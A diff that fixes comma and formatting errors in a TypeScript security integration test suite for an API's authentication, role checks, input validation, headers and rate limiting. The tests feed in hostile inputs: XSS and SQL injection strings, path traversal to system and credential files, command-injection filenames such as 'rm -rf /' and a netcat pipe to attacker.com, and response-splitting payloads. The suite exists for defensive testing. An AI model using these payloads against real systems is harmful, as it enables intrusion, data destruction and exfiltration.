@@ -585,9 +585,9 @@ describe('Controller Security Integration Tests', () => {
       securityLogger.info(`[${testId}] Authentication requirement enforced`);
     });
 
-    it('should accept valid authentication tokens'async () => {
-      const testId = `${operationId}_valid_auth`;securityLogger.info(`[${testId}] Testing valid authentication token acceptance`,
-      );
+    it('should accept valid authentication tokens', async () => {
+      const testId = `${operationId}_valid_auth`;
+      securityLogger.info(`[${testId}] Testing valid authentication token acceptance`);
 
       const response = await createRequest(app)
         .get('/api/protected').set('Authorization', 'Bearer admin-token').expect(200);
@@ -605,18 +605,24 @@ describe('Controller Security Integration Tests', () => {
       securityLogger.info(`[${testId}] Valid authentication token accepted`);
     });
 
-    it('should reject invalid authentication tokens'async () => {
-      const testId = `${operationId}_invalid_auth`;securityLogger.info(`[${testId}] Testing invalid authentication token rejection`,
-      );
+    it('should reject invalid authentication tokens', async () => {
+      const testId = `${operationId}_invalid_auth`;
+      securityLogger.info(`[${testId}] Testing invalid authentication token rejection`);
 
       const invalidTokens = [
-        'invalid-token','expired-token','malicious-token','','Bearer-without-space','NotBearer valid-token'];
+        'invalid-token',
+        'expired-token',
+        'malicious-token',
+        '',
+        'Bearer-without-space',
+        'NotBearer valid-token'
+      ];
 
       for (const token of invalidTokens) {
         const authHeader = token.includes('Bearer') ? token : `Bearer ${token}`;
 
         await createRequest(app)
-          .get('/api/protected').set('Authorization'authHeader)
+          .get('/api/protected').set('Authorization', authHeader)
           .expect(401);
       }
 
@@ -625,8 +631,9 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should handle malformed authorization headers'async () => {
-      const testId = `${operationId}_malformed_headers`;securityLogger.info(`[${testId}] Testing malformed authorization header handling`,
+    it('should handle malformed authorization headers', async () => {
+      const testId = `${operationId}_malformed_headers`;
+      securityLogger.info(`[${testId}] Testing malformed authorization header handling`,
       );
 
       const malformedHeaders = [
@@ -639,7 +646,7 @@ describe('Controller Security Integration Tests', () => {
 
       for (const header of malformedHeaders) {
   await createRequest(app)
-          .get('/api/protected').set('Authorization'header)
+          .get('/api/protected').set('Authorization', header)
           .expect(401);
       
 }
@@ -651,7 +658,7 @@ describe('Controller Security Integration Tests', () => {
   });
 
     describe('Authorization and Role-Based Access', () => {
-  it('should enforce admin-only access'async () => {
+  it('should enforce admin-only access', async () => {
       const testId = `${operationId
 }_admin_only`;securityLogger.info(`[${testId}] Testing admin-only access enforcement`);
 
@@ -663,13 +670,13 @@ describe('Controller Security Integration Tests', () => {
       await createRequest(app)
         .get('/api/admin').set('Authorization', 'Bearer operator-token').expect(403);// Viewer should be denied
       await createRequest(app)
-        .get('/api/admin').set('Authorization''Bearer viewer-token')
+        .get('/api/admin').set('Authorization', 'Bearer viewer-token')
         .expect(403);
 
       securityLogger.info(`[${testId}] Admin-only access properly enforced`);
     });
 
-    it('should enforce operator-level access'async () => {
+    it('should enforce operator-level access', async () => {
       const testId = `${operationId}_operator_access`;securityLogger.info(`[${testId}] Testing operator-level access enforcement`,
       );
 
@@ -691,7 +698,7 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should enforce role hierarchy correctly'async () => {
+    it('should enforce role hierarchy correctly', async () => {
       const testId = `${operationId}_role_hierarchy`;securityLogger.info(`[${testId}] Testing role hierarchy enforcement`);
 
       const testCases = [
@@ -702,7 +709,7 @@ describe('Controller Security Integration Tests', () => {
       for (const testCase of testCases) {
   const method = testCase.endpoint.includes('resources') ? 'post' : 'get';const expectedStatus = testCase.shouldPass ? 200 : 403;const requestObj = createRequest(app);
         let req = requestObj[method](testCase.endpoint).set(
-          'Authorization'`Bearer ${testCase.token
+          'Authorization', `Bearer ${testCase.token
 }`,
         );
 
@@ -717,7 +724,7 @@ describe('Controller Security Integration Tests', () => {
   });
 
     describe('Input Validation and Injection Prevention', () => {
-  it('should sanitize XSS attempts in request data'async () => {
+  it('should sanitize XSS attempts in request data', async () => {
       const testId = `${operationId
 }_xss_prevention`;securityLogger.info(`[${testId}] Testing XSS prevention in request data`);
 
@@ -725,7 +732,7 @@ describe('Controller Security Integration Tests', () => {
   name: '<script>alert("XSS")</script>',
         description: '<img src=x onerror=alert("XSS")>',
         type: 'javascript:alert("XSS")',
-        metadata: {,
+        metadata: {
   tag: '<svg onload=alert("XSS")>', note: '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
         
 },
@@ -752,7 +759,7 @@ describe('Controller Security Integration Tests', () => {
       securityLogger.info(`[${testId}] XSS payloads safely handled`);
     });
 
-    it('should prevent SQL injection in search queries'async () => {
+    it('should prevent SQL injection in search queries', async () => {
       const testId = `${operationId}_sql_injection`;securityLogger.info(`[${testId}] Testing SQL injection prevention`);
 
       const sqlInjectionQueries = [
@@ -781,16 +788,26 @@ describe('Controller Security Integration Tests', () => {
       securityLogger.info(`[${testId}] SQL injection attempts safely handled`);
     });
 
-    it('should validate and sanitize file upload parameters'async () => {
-      const testId = `${operationId}_file_upload_validation`;securityLogger.info(`[${testId}] Testing file upload parameter validation`,
-      );
+    it('should validate and sanitize file upload parameters', async () => {
+      const testId = `${operationId}_file_upload_validation`;
+      securityLogger.info(`[${testId}] Testing file upload parameter validation`);
 
       const maliciousFileNames = [
-        '../../../etc/passwd','..\\..\\..\\windows\\system32\\config\\sam','file.php%00.txt','<script>alert("XSS")</script>.txt",'file; rm -rf /','file | nc attacker.com 4444',];
+        '../../../etc/passwd',
+        '..\\..\\..\\windows\\system32\\config\\sam',
+        'file.php%00.txt',
+        '<script>alert("XSS")</script>.txt',
+        'file; rm -rf /',
+        'file | nc attacker.com 4444'
+      ];
 
       for (const filename of maliciousFileNames) {
-  const response = await createRequest(app)
-          .post('/api/upload').set('Authorization', 'Bearer operator-token').set('X-Filename', filename).set('Content-Length''1024').expect(200);
+        const response = await createRequest(app)
+          .post('/api/upload')
+          .set('Authorization', 'Bearer operator-token')
+          .set('X-Filename', filename)
+          .set('Content-Length', '1024')
+          .expect(200);
 
         // Should handle malicious filenames safely
         expect((response.body as FileUploadResponse).filename).toBeDefined();
@@ -803,14 +820,14 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should handle oversized request payloads'async () => {
+    it('should handle oversized request payloads', async () => {
       const testId = `${operationId}_oversized_payloads`;securityLogger.info(`[${testId}] Testing oversized request _payload handling`,
       );
 
       const oversizedData = {
   name: 'Large Resource',
         description: 'A'.repeat(50000), // 50KB description,
-  metadata: {,
+  metadata: {
   largeField: 'B'.repeat(100000), // 100KB field,
   anotherField: 'C'.repeat(75000), // 75KB field
         
@@ -830,11 +847,20 @@ describe('Controller Security Integration Tests', () => {
   });
 
     describe('Security Headers and CORS', () => {
-  it('should include all required security headers'async () => {
-      const testId = `${operationId
-}_security_headers`;securityLogger.info(`[${testId}] Testing security headers inclusion`);
+  it('should include all required security headers', async () => {
+      const testId = `${operationId}_security_headers`;
+      securityLogger.info(`[${testId}] Testing security headers inclusion`);
 
-      const response = await createRequest(app).get('/public/data').expect(200);const requiredHeaders = {'x-content-type-options': 'nosniff','x-frame-options': 'DENY','x-xss-protection': '1; mode=block','strict-transport-security': 'max-age=31536000; includeSubDomains','content-security-policy': "default-src 'self'','referrer-policy': 'strict-origin-when-cross-origin',};for (const [headerexpectedValue] of Object.entries(requiredHeaders)) {
+      const response = await createRequest(app).get('/public/data').expect(200);
+      const requiredHeaders = {
+        'x-content-type-options': 'nosniff',
+        'x-frame-options': 'DENY',
+        'x-xss-protection': '1; mode=block',
+        'strict-transport-security': 'max-age=31536000; includeSubDomains',
+        'content-security-policy': "default-src 'self'",
+        'referrer-policy': 'strict-origin-when-cross-origin',
+      };
+      for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
   expect(response.headers[header]).toContain(expectedValue.split(';')[0]);
       
 }
@@ -842,7 +868,7 @@ describe('Controller Security Integration Tests', () => {
       securityLogger.info(`[${testId}] All required security headers present`);
     });
 
-    it('should handle CORS preflight requests securely'async () => {
+    it('should handle CORS preflight requests securely', async () => {
       const testId = `${operationId}_cors_security`;securityLogger.info(`[${testId}] Testing CORS preflight security`);
 
       // Test preflight from allowed origin
@@ -862,9 +888,9 @@ describe('Controller Security Integration Tests', () => {
   });
 
     describe('Rate Limiting and DoS Protection', () => {
-  it('should enforce rate limits on API endpoints'async () => {
-      const testId = `${operationId
-}_rate_limiting`;securityLogger.info(`[${testId}] Testing API endpoint rate limiting`);
+  it('should enforce rate limits on API endpoints', async () => {
+      const testId = `${operationId}_rate_limiting`;
+      securityLogger.info(`[${testId}] Testing API endpoint rate limiting`);
 
       // Make requests up to the limit
       const requests = Array(105)
@@ -887,7 +913,7 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should handle burst traffic gracefully'async () => {
+    it('should handle burst traffic gracefully', async () => {
       const testId = `${operationId}_burst_traffic`;securityLogger.info(`[${testId}] Testing burst traffic handling`);
 
       const startTime = Date.now();
@@ -898,7 +924,10 @@ describe('Controller Security Integration Tests', () => {
         .map(
           (_, _index) =>
             createRequest(app)
-              .get('/public/data').set('X-Forwarded-For'`192.168.1.${200 + _index}`), // Different IPs);const responses = await Promise.all(promises);
+              .get('/public/data')
+              .set('X-Forwarded-For', `192.168.1.${200 + _index}`), // Different IPs
+        );
+      const responses = await Promise.all(promises);
       const processingTime = Date.now() - startTime;
 
       // All requests should complete (success or rate limited)
@@ -914,7 +943,7 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should protect against slowloris attacks'async () => {
+    it('should protect against slowloris attacks', async () => {
       const testId = `${operationId}_slowloris_protection`;securityLogger.info(`[${testId}] Testing slowloris attack protection`);
 
       // Simulate slow requests (timeout protection)
@@ -923,11 +952,12 @@ describe('Controller Security Integration Tests', () => {
         .map(() => {
           return new Promise<{ error: boolean; status?: number }>((resolve) => {
   const _req = createRequest(app)
-              .post('/api/resources').set('Authorization', 'Bearer admin-token').send({ name: 'Slow Request' 
-})
+              .post('/api/resources')
+              .set('Authorization', 'Bearer admin-token')
+              .send({ name: 'Slow Request' })
               .timeout(5000) // 5 second timeout
-              .end((errres) => {
-                resolve({ error: !!errstatus: res?.status });
+              .end((err, res) => {
+                resolve({ error: !!err, status: res?.status });
               });
           });
         });
@@ -945,7 +975,7 @@ describe('Controller Security Integration Tests', () => {
   });
 
     describe('Attack Vector Testing', () => {
-  it('should prevent header injection attacks'async () => {
+  it('should prevent header injection attacks', async () => {
       const testId = `${operationId
 }_header_injection`;securityLogger.info(`[${testId}] Testing header injection attack prevention`,
       );
@@ -968,18 +998,21 @@ describe('Controller Security Integration Tests', () => {
       securityLogger.info(`[${testId}] Header injection attempts blocked`);
     });
 
-    it('should prevent HTTP response splitting'async () => {
+    it('should prevent HTTP response splitting', async () => {
       const testId = `${operationId}_response_splitting`;securityLogger.info(`[${testId}] Testing HTTP response splitting prevention`,
       );
 
       const splittingPayloads = [
-        'search\r\nSet-Cookie: evil=true','query\r\n\r\n<script>alert("XSS")</script>",'param\rContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n',];
+        'search\r\nSet-Cookie: evil=true',
+        'query\r\n\r\n<script>alert("XSS")</script>',
+        'param\rContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n',
+      ];
 
       for (const _payload of splittingPayloads) {
   const _response = await createRequest(app)
-          .get('/api/users/search').query({,
+          .get('/api/users/search').query({
   q: _payload 
-}).set('Authorization''Bearer operator-token').expect((res) => {
+}).set('Authorization', 'Bearer operator-token').expect((res) => {
   // Should not split response or inject headers
             expect(res.status).toBeLessThan(500);
       expect(res.headers['set-cookie']).toBeUndefined();
@@ -992,7 +1025,7 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should handle request smuggling attempts'async () => {
+    it('should handle request smuggling attempts', async () => {
       const testId = `${operationId}_request_smuggling`;securityLogger.info(`[${testId}] Testing request smuggling prevention`);
 
       // Attempt request smuggling with conflicting headers
@@ -1007,7 +1040,7 @@ describe('Controller Security Integration Tests', () => {
       securityLogger.info(`[${testId}] Request smuggling attempts handled`);
     });
 
-    it('should prevent directory traversal attacks'async () => {
+    it('should prevent directory traversal attacks', async () => {
       const testId = `${operationId}_directory_traversal`;securityLogger.info(`[${testId}] Testing directory traversal attack prevention`,
       );
 
@@ -1018,7 +1051,7 @@ describe('Controller Security Integration Tests', () => {
   const _response = await createRequest(app)
           .delete(`/api/resources/${encodeURIComponent(_payload)
 }`)
-          .set('Authorization''Bearer admin-token')
+          .set('Authorization', 'Bearer admin-token')
           .expect((res) => {
   // Should not access restricted files
             expect(res.status).toBeLessThan(500);
@@ -1031,7 +1064,7 @@ describe('Controller Security Integration Tests', () => {
   });
 
     describe('Security Monitoring and Logging', () => {
-  it('should log security events appropriately'async () => {
+  it('should log security events appropriately', async () => {
       const testId = `${operationId
 }_security_logging`;securityLogger.info(`[${testId}] Testing security event logging`);
 
@@ -1048,7 +1081,7 @@ describe('Controller Security Integration Tests', () => {
       // Generate security events
       await createRequest(app)
         .get('/api/admin').set('Authorization', 'Bearer malicious-token').expect(401);await createRequest(app)
-        .get('/api/admin').set('Authorization''Bearer viewer-token')
+        .get('/api/admin').set('Authorization', 'Bearer viewer-token')
         .expect(403);
 
       // Restore console
@@ -1063,7 +1096,7 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should maintain audit trail for sensitive operations'async () => {
+    it('should maintain audit trail for sensitive operations', async () => {
       const testId = `${operationId}_audit_trail`;securityLogger.info(`[${testId}] Testing audit trail for sensitive operations`,
       );
 
@@ -1091,7 +1124,7 @@ describe('Controller Security Integration Tests', () => {
 }
 
         let reqWithAuth = baseRequest.set(
-          'Authorization'`Bearer ${operation.token}`,);if (operation.body) {
+          'Authorization', `Bearer ${operation.token}`,);if (operation.body) {
   reqWithAuth = reqWithAuth.send(operation.body);
         
 }
@@ -1113,7 +1146,7 @@ describe('Controller Security Integration Tests', () => {
   });
 
     describe('Performance Under Security Load', () => {
-  it('should maintain performance during security validation'async () => {
+  it('should maintain performance during security validation', async () => {
       const testId = `${operationId
 }_security_performance`;securityLogger.info(`[${testId}] Testing performance under security validation load`,
       );
@@ -1125,7 +1158,9 @@ describe('Controller Security Integration Tests', () => {
         .fill(null)
         .map((_, _index) =>
           createRequest(app)
-            .get('/api/protected').set('Authorization', 'Bearer admin-token').set('X-Request-ID'`perf-test-${_index}`),);const responses = await Promise.all(promises);
+            .get('/api/protected').set('Authorization', 'Bearer admin-token').set('X-Request-ID', `perf-test-${_index}`),
+        );
+      const responses = await Promise.all(promises);
       const processingTime = Date.now() - startTime;
 
       // All should succeed
@@ -1141,7 +1176,7 @@ describe('Controller Security Integration Tests', () => {
       );
     });
 
-    it('should handle mixed attack and legitimate traffic'async () => {
+    it('should handle mixed attack and legitimate traffic', async () => {
       const testId = `${operationId}_mixed_traffic`;securityLogger.info(`[${testId}] Testing mixed attack and legitimate traffic handling`,
       );
 
